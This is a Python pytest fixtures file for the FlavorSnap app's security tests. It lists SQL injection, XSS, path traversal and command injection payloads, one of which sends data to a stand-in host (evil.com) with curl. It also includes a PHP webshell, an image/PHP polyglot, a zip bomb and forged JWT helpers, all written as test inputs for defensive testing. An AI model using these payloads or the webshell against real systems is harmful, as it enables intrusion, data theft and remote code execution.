"""
Shared fixtures for FlavorSnap security test suite.
"""
from __future__ import annotations

import base64
import io
import struct
import time

import pytest
from PIL import Image


SQL_INJECTION_PAYLOADS: list[str] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, username, password FROM users --",
    "1; SELECT * FROM information_schema.tables --",
    "' OR SLEEP(5) --",
    "admin'--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
]

XSS_PAYLOADS: list[str] = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')",
    "<svg onload=alert('xss')>",
    "'\"><script>alert(document.cookie)</script>",
    "<body onload=alert('xss')>",
    "{{7*7}}",
    "${7*7}",
    "<iframe src='javascript:alert(1)'></iframe>",
    "data:text/html,<script>alert('xss')</script>",
]

PATH_TRAVERSAL_PAYLOADS: list[str] = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00.jpg",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "%2fetc%2fpasswd",
    "....\\....\\....\\etc\\passwd",
    "../etc/shadow",
]

COMMAND_INJECTION_PAYLOADS: list[str] = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "; ping -c 4 127.0.0.1",
    "& dir",
    "|| id",
    "\n/bin/sh",
    "'; exec('id'); '",
    "$(curl http://evil.com/$(whoami))",
]

OVERSIZED_PAYLOAD: str = "A" * 100_001


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_tampered_jwt(original_token: str) -> str:
    parts = original_token.split(".")
    if len(parts) != 3:
        return original_token
    sig = parts[2]
    tampered_sig = sig[:-1] + ("A" if sig[-1] != "A" else "B")
    return ".".join([parts[0], parts[1], tampered_sig])


def make_none_alg_jwt(payload_dict: dict) -> str:
    import json
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps(payload_dict).encode())
    return f"{header}.{payload}."


def make_expired_jwt_claims() -> dict:
    past = int(time.time()) - 3600
    return {"sub": "test-user", "exp": past, "iat": past - 3600}


@pytest.fixture(scope="session")
def valid_jpeg_bytes() -> bytes:
    img = Image.new("RGB", (32, 32), (200, 100, 50))
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    return buf.getvalue()


@pytest.fixture(scope="session")
def valid_png_bytes() -> bytes:
    img = Image.new("RGB", (64, 64), (123, 45, 67))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


@pytest.fixture(scope="session")
def corrupted_image_bytes() -> bytes:
    return b"this is not an image"


@pytest.fixture(scope="session")
def malicious_svg_bytes() -> bytes:
    return b"""<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('xss')</script>
  <rect width="100" height="100"/>
</svg>"""


@pytest.fixture(scope="session")
def php_webshell_bytes() -> bytes:
    return b"<?php system($_GET['cmd']); ?>"


@pytest.fixture(scope="session")
def polyglot_image_bytes() -> bytes:
    img = Image.new("RGB", (1, 1), (255, 0, 0))
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    return buf.getvalue() + b"\n<?php system($_GET['cmd']); ?>"


@pytest.fixture(scope="session")
def oversized_image_bytes() -> bytes:
    img = Image.new("RGB", (4000, 4000), (128, 128, 128))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


@pytest.fixture(scope="session")
def zip_bomb_bytes() -> bytes:
    compressed_data = b"\x78\x9c" + b"\x00" * 20
    local_header = struct.pack(
        "<4s2B4HL2L2H",
        b"PK\x03\x04",
        20, 0,
        8, 0,
        0, 0,
        len(compressed_data),
        1_073_741_824,
        len("bomb.txt"),
        0,
    ) + b"bomb.txt" + compressed_data
    return local_header


@pytest.fixture(params=SQL_INJECTION_PAYLOADS)
def sql_payload(request: pytest.FixtureRequest) -> str:
    return request.param  # type: ignore[return-value]


@pytest.fixture(params=XSS_PAYLOADS)
def xss_payload(request: pytest.FixtureRequest) -> str:
    return request.param  # type: ignore[return-value]


@pytest.fixture(params=PATH_TRAVERSAL_PAYLOADS)
def path_traversal_payload(request: pytest.FixtureRequest) -> str:
    return request.param  # type: ignore[return-value]


@pytest.fixture(params=COMMAND_INJECTION_PAYLOADS)
def cmd_injection_payload(request: pytest.FixtureRequest) -> str:
    return request.param  # type: ignore[return-value]
